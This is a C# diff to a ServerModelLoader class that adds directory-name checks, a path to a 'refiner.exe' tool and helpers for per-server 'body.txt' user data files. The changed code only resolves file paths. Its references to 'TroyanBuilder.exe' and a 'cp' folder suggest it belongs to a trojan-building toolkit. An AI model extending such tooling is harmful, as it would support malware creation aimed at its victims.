@@ -82,7 +82,7 @@ public static class ServerModelLoader
                 {
                     var name = System.IO.Path.GetFileName(dir);
 
-                    if (name.ToLower(CultureInfo.InvariantCulture) == "troyanbuilder" || name.ToLower(CultureInfo.InvariantCulture) == "cp" || name.ToLower(CultureInfo.InvariantCulture) == "refiner")
+                    if (name.ToLower(CultureInfo.InvariantCulture) == "foregrounder" || name.ToLower(CultureInfo.InvariantCulture) == "troyanbuilder" || name.ToLower(CultureInfo.InvariantCulture) == "cp" || name.ToLower(CultureInfo.InvariantCulture) == "refiner")
                     {
                         dir = Directory.GetParent(dir)?.FullName;
                         _rootDirStatic = dir;
@@ -113,6 +113,31 @@ public static class ServerModelLoader
                 result = Path.Combine(CpDirStatic, "TroyanBuilder.exe");
             return result;
         }
+    }
+    
+    public static string Refiner
+    {
+        get
+        {
+            var result = Path.Combine(RootDirStatic, "refiner","bin/debug/net7.0/refiner.exe");
+            if (!File.Exists(result))
+                result = Path.Combine(CpDirStatic, "refiner.exe");
+            return result;
+        }
+    }
+
+    public static string UserDataDir(string server)
+    {
+        if (server == null)
+            server = "";
+        return Path.Combine(RootDataStatic,server);
+    }
+    
+    public const string BodyFileConst = "body.txt";
+    
+    public static string UserDataBody(string server)
+    {
+        return Path.Combine(UserDataDir(server), BodyFileConst);
     }
 
     public static string CpDirStatic => Path.Combine(RootDirStatic, "cp");
